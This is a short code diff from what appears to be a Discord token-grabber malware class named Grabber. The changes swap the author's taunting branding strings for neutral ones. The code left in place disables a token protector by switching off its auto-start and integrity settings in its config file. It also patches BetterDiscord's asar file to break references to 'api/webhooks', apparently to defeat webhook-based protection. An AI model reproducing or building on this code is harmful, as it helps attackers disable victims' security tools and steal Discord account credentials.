@@ -674,7 +674,6 @@ class Grabber(functions):
                     item = json.load(f)
                 except json.decoder.JSONDecodeError:
                     return
-                item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
@@ -692,7 +691,7 @@ class Grabber(functions):
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, 'a') as f:
                 f.write(
-                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
+                    "")
 
     async def bypassBetterDiscord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
@@ -700,7 +699,7 @@ class Grabber(functions):
             x = "api/webhooks"
             with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                 txt = f.read()
-                content = txt.replace(x, 'RdimoTheGoat')
+                content = txt.replace(x, 'XERROR')
             with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                 f.write(content)
 
